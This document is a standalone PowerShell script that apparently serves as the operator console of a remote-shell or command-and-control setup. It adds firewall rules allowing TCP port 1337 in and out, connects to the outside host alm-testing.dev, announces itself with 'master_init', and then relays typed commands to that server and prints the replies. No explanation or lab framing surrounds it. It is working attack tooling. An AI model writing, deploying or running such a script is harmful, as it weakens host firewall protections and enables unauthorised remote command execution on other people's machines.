if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort 1337 -Protocol TCP -Action Allow
} 

if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
} 

try {
	$client = New-Object System.Net.Sockets.TCPClient("alm-testing.dev", 1337);
	$client.ReceiveTimeout = 5000;
	$stream = $client.GetStream();
	$stream.ReadTimeout = 10000;
	$stream.WriteTimeout = 10000;
	$writer = New-Object System.IO.StreamWriter($stream);
	$reader = New-Object System.IO.StreamReader($stream);
	$writer.WriteLine("master_init");
	$writer.Flush();

	$in_buff = [char[]]::new(1024)
	$exit = 0;
	while ($exit -eq 0) {
		if($client.Client.Poll(50000,[System.Net.Sockets.SelectMode]::SelectRead) -eq $true) {
			if ($client.Client.Available -eq 0) {
				Write-Output "Connection to server lost";
				$exit = 1;
			} else {
				while ($reader.Peek() -ge 0) {		
					$in_buff = $reader.ReadLine();
					Write-Output $in_buff;
				}
			}				
		} 
		
		if ($exit -ne 1) {
			$cmd = Read-host "cmd";
			if ($cmd -ne "") {
				$writer.WriteLine($cmd);
				$writer.Flush();
			}
		}
	}
}
catch {
	Write-Output $_;
}